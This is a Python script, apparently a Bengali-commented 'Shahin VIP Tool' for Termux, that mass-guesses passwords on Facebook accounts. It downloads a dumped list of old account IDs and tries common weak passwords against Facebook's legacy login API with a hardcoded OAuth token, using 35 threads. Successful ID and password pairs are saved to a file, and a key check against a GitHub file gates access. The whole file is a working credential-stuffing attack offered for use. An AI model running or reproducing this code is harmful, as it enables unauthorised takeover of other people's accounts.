import os, time, random, sys, requests, uuid

# Colors
G = '\033[1;92m' 
Y = '\033[1;93m' 
W = '\033[1;97m' 
S = '\033[1;96m' 
R = '\033[1;91m'

loop, oks = 0, []

# --- KEY APPROVAL SYSTEM ---
def approval():
    os.system('clear')
    # ইউজার ডিভাইসের আইডি
    id = str(os.getlogin())
    key = f"SHAHIN-VIP-{id.upper()}"
    
    # আপনার দেওয়া গিটহাব লিঙ্ক
    approval_url = "https://raw.githubusercontent.com/w8Shahin/Approval-control/refs/heads/main/Keys.txt"
    
    print(f"{G} [•] WELCOME TO SHAHIN VIP TOOL")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f" {Y}[!] STATUS : CHECKING APPROVAL...")
    print(f" {W}[•] YOUR KEY : {G}{key}")
    print(f"{W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    try:
        active_keys = requests.get(approval_url).text
        if key in active_keys:
            print(f" {G}[√] ACCESS GRANTED! WELCOME SHAHIN BIN AHMED")
            time.sleep(2)
            Main()
        else:
            print(f" {R}[×] YOUR KEY IS NOT APPROVED")
            print(f" {W}[•] Send Key to Admin for Permission")
            input(f" {G}[Enter] To Message Admin on WhatsApp")
            # এখানে আপনার নম্বরটি দিন
            os.system(f'termux-open-url "https://wa.me/+8801XXXXXXXXX?text=Assalamu%20Alaikum%20Shahin%20Vau,%20Approve%20My%20Key:%20{key}"')
            exit()
    except Exception as e:
        print(f" {R}[!] Network Error! Server not responding."); exit()

def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V20{W}''')
    print(f' {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(f' {W}[{G}•{W}] OWNER    : {G}SHAHIN BIN AHMED')
    print(f' {W}[{G}•{W}] TARGET   : {Y}OLD ACTIVE (2004-2010)')
    print(f' {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def Main():
    logo()
    print(f' {G}[1]{W} CLONE OLD ACTIVE IDS {S}(ONLINE DUMP)')
    print(f' {G}[2]{W} CLONE FROM YOUR OWN FILE')
    print(f' {G}[0]{W} EXIT')
    opt = input(f'\n {W}[{G}•{W}] CHOOSE : {G}')
    
    if opt == '1':
        # অনলাইন ডাম্প ফাইল ডাউনলোড
        logo()
        print(f" {W}[•] Downloading Fresh IDs from GitHub...")
        url = "https://raw.githubusercontent.com/Social-Engineer-Tool/dumps/main/bd_old_ids.txt"
        try:
            data = requests.get(url).text
            open('dump.txt','w').write(data)
            start_cloning('dump.txt')
        except: print("Network Error!"); exit()
    elif opt == '2':
        path = input(f" {W}[+] Enter File Path: {G}")
        start_cloning(path)
    else: exit()

def start_cloning(file_path):
    try:
        ids = open(file_path, 'r').read().splitlines()
    except: print("File not found!"); exit()
    
    logo()
    print(f" {W}[•] TOTAL TARGET: {len(ids)}")
    print(f" {W}[•] TARGET PASS: {Y}123456, 1234567, 123456789")
    print("-" * 45)
    
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    with ThreadPool(max_workers=35) as engine:
        for user in ids:
            uid = user.split('|')[0]
            # আপনার রিকোয়ারমেন্ট অনুযায়ী ওল্ড আইডির গোল্ডেন পাসওয়ার্ড
            pws = ['123456', '1234567', '12345678', '123456789', '11223344', '55667788', '572737']
            engine.submit(crack, uid, pws, len(ids))

def crack(uid, pws, limit):
    global loop, oks
    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        }
        data = {'email': uid, 'password': pw, 'format': 'json'}
        try:
            res = session.post('https://b-api.facebook.com/method/auth.login', data=data, headers=headers).json()
            if 'session_key' in res:
                print(f'\r\r{G}[SHAHIN-OK] {uid} | {pw}{W}')
                oks.append(uid)
                open('OK.txt', 'a').write(uid+'|'+pw+'\n')
                break
        except: pass
    global loop
    loop += 1
    sys.stdout.write(f'\r\r {W}[SCANNING] {loop}/{limit} OK:{G}{len(oks)}{W}'); sys.stdout.flush()

if __name__ == "__main__":
    approval()
